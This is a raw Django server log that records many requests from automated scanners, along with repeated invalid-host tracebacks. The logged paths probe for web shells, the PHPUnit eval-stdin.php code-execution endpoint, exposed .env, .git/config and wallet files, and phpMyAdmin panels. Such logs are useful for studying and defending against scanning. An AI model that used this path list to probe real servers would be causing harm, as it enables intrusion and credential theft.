Not Found: /wp-admin/network/cloud.php
Not Found: /cloud.php
Not Found: /cgi-bin/cloud.php
Not Found: /wp-content/updates.php
Not Found: /css/cloud.php
Not Found: /wp-admin/user/cloud.php
Not Found: /img/cloud.php
Not Found: /wp-admin/css/colors/coffee/cloud.php
Not Found: /wp-admin/images/cloud.php
Not Found: /avaa.php
Not Found: /images/cloud.php
Not Found: /wp-admin/js/widgets/cloud.php
Not Found: /wp-includes/Requests/Text/admin.php
Not Found: /wp-admin/css/colors/cloud.php
Not Found: /wp-admin/includes/cloud.php
Not Found: /wp-admin/css/colors/blue/cloud.php
Not Found: /wp-admin/cloud.php
Not Found: /updates.php
Not Found: /libraries/legacy/updates.php
Not Found: /libraries/phpmailer/updates.php
Not Found: /libraries/vendor/updates.php
Not Found: /alfa-rex.php7
Not Found: /alfanew.php
Not Found: /wp-content/plugins/Cache/Cache.php
Not Found: /wp-admin/js/widgets/about.php7
Not Found: /wp-p.php7
Not Found: /wp-admin/repeater.php
Not Found: /wp-includes/repeater.php
Not Found: /wp-content/repeater.php
Not Found: /wsoyanz.php
Not Found: /yanz.php
Not Found: /wp-admin/js/about.php
Not Found: /wp-content/plugins/seoo/wsoyanz.php
Not Found: /wp-content/plugins/seoo/wsoyanz1.php
Not Found: /cache-compat.php
Not Found: /ajax-actions.php
Not Found: /wp-admin/ajax-actions.php
Not Found: /wp-consar.php
Not Found: /repeater.php
Not Found: /admin-post.php
Not Found: /wp-admin/maint/maint/ajax-actions.php
Not Found: /wp-admin/dropdown.php
Not Found: /wp-admin/css/index.php
Not Found: /dropdown.php
Not Found: /about.php
Not Found: /admin.php
Not Found: /about.php7
Not Found: /alfanew.php7
Not Found: /adminfuns.php7
Not Found: /ebs.php7
Not Found: /ws.php7
Not Found: /alfanew2.php7
Not Found: /alfa-rex2.php7
Not Found: /.well-known/acme-challenge/cloud.php
Not Found: /wp-admin/images/index.php
Not Found: /wp-admin/css/colors/index.php
Not Found: /wp-content/themes/pridmag/db.php
Not Found: /wp-content/themes/seotheme/mar.php
Not Found: /wp-content/plugins/linkpreview/db.php
Not Found: /wp-content/themes/seotheme/db.php
Not Found: /wp-content/plugins/seoplugins/db.php
Not Found: /wp-content/plugins/seoplugins/mar.php
Not Found: /.well-known/pki-validation/xmrlpc.php
Not Found: /.well-known/acme-challenge/xmrlpc.php
Not Found: /wp-admin/network/xmrlpc.php
Not Found: /xmrlpc.php
Not Found: /cgi-bin/xmrlpc.php
Not Found: /css/xmrlpc.php
Not Found: /wp-admin/user/xmrlpc.php
Not Found: /img/xmrlpc.php
Not Found: /wp-admin/css/colors/coffee/xmrlpc.php
Not Found: /wp-admin/images/xmrlpc.php
Not Found: /images/xmrlpc.php
Not Found: /wp-admin/js/widgets/xmrlpc.php
Not Found: /wp-admin/css/colors/xmrlpc.php
Not Found: /wp-admin/includes/xmrlpc.php
Not Found: /wp-admin/css/colors/blue/xmrlpc.php
Not Found: /wp-admin/xmrlpc.php
Not Found: /shell
Not Found: /webui/
Not Found: /geoserver/web/
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /hello.world
Not Found: /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/Util/PHP/eval-stdin.php
Not Found: /vendor/phpunit/phpunit/LICENSE/eval-stdin.php
Not Found: /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /phpunit/src/Util/PHP/eval-stdin.php
Not Found: /phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /lib/phpunit/Util/PHP/eval-stdin.php
Not Found: /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
Not Found: /index.php
Not Found: /public/index.php
Not Found: /index.php
Not Found: /index.php
Not Found: /containers/json
Not Found: /robots.txt
Not Found: /.well-known/security.txt
Not Found: /ReportServer
Not Found: /robots.txt
Not Found: /druid/index.html
Not Found: /robots.txt
Not Found: /libs/js/iframe.js
Not Found: /.git/config
Not Found: /robots.txt
Not Found: /.svn
Not Found: /news/pta-set-to-grant-starlink-license-for-ultra-fast-internet-connectivity/
Not Found: /.env
Not Found: /.env
Not Found: /.env
Not Found: /robots.txt
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/index.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/index.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/index.html
Not Found: /news/rhino-numbers-tick-higher-but-poachers-lurk-amid-high-demand-for-horns/contact.html
Not Found: /news/new-study-suggests-ocean-of-water-lies-beneath-marss-surface/contact.html
Not Found: /Blogs/index.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/index.html
Not Found: /news/pakistan-to-launch-home-grown-messaging-app-amid-internet-disruptions/contact.html
Not Found: /news/Govt-unsuccessful-in-winning-over-Fazl/contact.html
Not Found: /index.html
Not Found: /contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/contact.html
Not Found: /blogs/login-form-in-vbnet-with-sql/index.html
Not Found: /news/mpox-crisis-why-do-african-countries-struggle-to-make-or-buy-vaccines/contact.html
Not Found: /Blogs/contact.html
Not Found: /contact/contact.html
Not Found: /contact/index.html
Not Found: /youtube-video-downloader/index.html/
Not Found: /index.html
Not Found: /contact.html
Not Found: /youtube-video-downloader/contact.html/
Not Found: //.env
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /hudson
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /.env
Not Found: /wp-login.php
Not Found: /.git/config
Not Found: /.env
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /logon.htm
Not Found: /.env
Not Found: /robots.txt
Not Found: /.env
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /contact.html
Not Found: /contact.html
Not Found: /contact.html
Not Found: /contact.html
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /logon.htm
Not Found: /.env
Not Found: /wp-includes/js/jquery/jquery.js
Not Found: /.env
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Forbidden (CSRF cookie not set.): /
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /logon.htm
Not Found: /libs/js/iframe.js
Not Found: /.git/config
Not Found: /form.html
Not Found: /upl.php
Not Found: /t4
Not Found: /geoip/
Not Found: /1.php
Not Found: /systembc/password.php
Not Found: /password.php
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Not Found: /.git/config
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /robots.txt
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /logon.htm
Invalid HTTP_HOST header: 'httpbin.org'. You may need to add 'httpbin.org' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'httpbin.org'. You may need to add 'httpbin.org' to ALLOWED_HOSTS.
Bad Request: /ip
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Not Found: /_phpmyadmin_/index.php
Not Found: /wp-content/plugins/portable-phpmyadmin/wp-pma-mod/index.php
Not Found: /phpmyadmin2021/index.php
Not Found: /db/dbweb/index.php
Not Found: /phpMyAdmin_/index.php
Not Found: /phpMyAdmin-5.2.1/index.php
Not Found: /mysqlmanager/index.php
Not Found: /phpMyAdmin-5.2/index.php
Not Found: /phpmyadmin2022/index.php
Not Found: /phpMyAdmin-latest-all-languages/index.php
Not Found: /db/phpMyAdmin-4/index.php
Not Found: /db/phpmyadmin/index.php
Not Found: /mysqladmin/index.php
Not Found: /dbadmin/index.php
Not Found: /phpmyadmin2019/index.php
Not Found: /db/db-admin/index.php
Not Found: /index.php
Not Found: /sql/myadmin/index.php
Not Found: /sql/phpmyadmin5/index.php
Not Found: /phpMyAdmin1/index.php
Not Found: /phppma/index.php
Not Found: /db/phpMyAdmin-5/index.php
Not Found: /administrator/phpmyadmin/index.php
Not Found: /administrator/admin/index.php
Not Found: /sql/phpmyadmin3/index.php
Not Found: /sql/sql-admin/index.php
Not Found: /_phpmyadmin/index.php
Not Found: /phpMyadmin/index.php
Not Found: /phpmyadmin2/index.php
Not Found: /myadmin/index.php
Not Found: /phpmyadmin/index.php
Not Found: /sql/phpmanager/index.php
Not Found: /phpMyAdmin-4.9.10-all-languages/index.php
Not Found: /phpMyAdmin3/index.php
Not Found: /sql/phpMyAdmin/index.php
Not Found: /administrator/PMA/index.php
Not Found: /phpmy/index.php
Not Found: /phpmyadmin4/index.php
Not Found: /db/webdb/index.php
Not Found: /php-myadmin/index.php
Not Found: /phpmyadmin5/index.php
Not Found: /1phpmyadmin/index.php
Not Found: /db/phpMyAdmin/index.php
Not Found: /phpMyAdmin5.1/index.php
Not Found: /phpMyAdmin5/index.php
Not Found: /phpMyAdmin-5.1.0/index.php
Not Found: /phpMyAdmin-5.2.1-english/index.php
Not Found: /PMA/index.php
Not Found: /sql/sqlweb/index.php
Not Found: /db/phpmyadmin5/index.php
Not Found: /administrator/pma/index.php
Not Found: /phpmyadmin1/index.php
Not Found: /phpMyAdmin-3/index.php
Not Found: /MyAdmin/index.php
Not Found: /sql/phpMyAdmin2/index.php
Not Found: /db/phpmyadmin4/index.php
Not Found: /administrator/web/index.php
Not Found: /phpMyAdmin-5.2.0-all-languages/index.php
Not Found: /db/index.php
Not Found: /sql/sqladmin/index.php
Not Found: /sql/webdb/index.php
Not Found: /mysql/db/index.php
Not Found: /_phpMyAdmin/index.php
Not Found: /db/myadmin/index.php
Not Found: /mysql/web/index.php
Not Found: /db/phpMyAdmin3/index.php
Not Found: /phpmyadmin_/index.php
Not Found: /mysql/sqlmanager/index.php
Not Found: /sql/php-myadmin/index.php
Not Found: /sqlmanager/index.php
Not Found: /phpMyAdmin6/index.php
Not Found: /phpMyAdmin6.0/index.php
Not Found: /mysql/admin/index.php
Not Found: /db/phpMyAdmin-3/index.php
Not Found: /phpMyAdmin-4.9.7/index.php
Not Found: /mysql/index.php
Not Found: /phpmyadmin6/index.php
Not Found: /administrator/phpMyAdmin/index.php
Not Found: /phpMyAdmin-5.1.1/index.php
Not Found: /phpMyAdmin2/index.php
Not Found: /mysql/dbadmin/index.php
Not Found: /sql/phpmyadmin4/index.php
Not Found: /phpmyadmin2018/index.php
Not Found: /sql/sql/index.php
Not Found: /mysql/pma/index.php
Not Found: /phpMyAdmin-5/index.php
Not Found: /mysql/pMA/index.php
Not Found: /phpMyAdmin-5.2.0/index.php
Not Found: /program/index.php
Not Found: /phpMyAdmin5.2/index.php
Not Found: /__phpmyadmin/index.php
Not Found: /shopdb/index.php
Not Found: /phpmyadmin2020/index.php
Not Found: /db/websql/index.php
Not Found: /database/index.php
Not Found: /phpMyAdmin-latest/index.php
Not Found: /pma/index.php
Not Found: /phpmyadmin2017/index.php
Not Found: /phpmyadmin3/index.php
Not Found: /mysql-admin/index.php
Not Found: /phpMyAdmin-4/index.php
Not Found: /phpMyAdmin-5.1.2/index.php
Not Found: /phpMyAdmin-5.2.1-all-languages/index.php
Not Found: /phpMyAdmin4/index.php
Not Found: /2phpmyadmin/index.php
Not Found: /phpMyAdmin/index.php
Not Found: /administrator/db/index.php
Not Found: /sql/websql/index.php
Not Found: /php-my-admin/index.php
Not Found: /phpmy-admin/index.php
Not Found: /sql/phpmy-admin/index.php
Not Found: /phpMyAdmin-5.1.3/index.php
Not Found: /db/webadmin/index.php
Not Found: /mysql/mysqlmanager/index.php
Not Found: /phpMyAdmin-latest-english/index.php
Not Found: /db/phpmyadmin3/index.php
Not Found: /sql/webadmin/index.php
Not Found: /db/dbadmin/index.php
Not Found: /phpmyAdmin/index.php
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /actuator/gateway/routes
Not Found: /.env
Not Found: /robots.txt
Not Found: /.git/config
Not Found: /.git/config
Not Found: /_profiler/phpinfo
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2018/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
Not Found: /site/wp-includes/wlwmanifest.xml
Not Found: /cms/wp-includes/wlwmanifest.xml
Not Found: /sito/wp-includes/wlwmanifest.xml
Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '/run/gunicorn.sock:'. The domain name provided is not valid according to RFC 1034/1035.
Bad Request: /
Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Traceback (most recent call last):
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/core/handlers/exception.py", line 55, in inner
    response = get_response(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/utils/deprecation.py", line 133, in __call__
    response = self.process_request(request)
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/middleware/common.py", line 48, in process_request
    host = request.get_host()
  File "/home/ubuntu/softtech/env/lib/python3.10/site-packages/django/http/request.py", line 151, in get_host
    raise DisallowedHost(msg)
django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
Bad Request: /logon.htm
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /image/lgbg.jpg
Not Found: /login.rsp
Not Found: /wallet.json
Not Found: /cgi-bin/luci/;stok=/locale
Not Found: /wp-includes/wlwmanifest.xml
Not Found: /xmlrpc.php
Not Found: /blog/wp-includes/wlwmanifest.xml
Not Found: /web/wp-includes/wlwmanifest.xml
Not Found: /wordpress/wp-includes/wlwmanifest.xml
Not Found: /website/wp-includes/wlwmanifest.xml
Not Found: /wp/wp-includes/wlwmanifest.xml
Not Found: /news/wp-includes/wlwmanifest.xml
Not Found: /2020/wp-includes/wlwmanifest.xml
Not Found: /2019/wp-includes/wlwmanifest.xml
Not Found: /shop/wp-includes/wlwmanifest.xml
Not Found: /wp1/wp-includes/wlwmanifest.xml
Not Found: /test/wp-includes/wlwmanifest.xml
Not Found: /wp2/wp-includes/wlwmanifest.xml
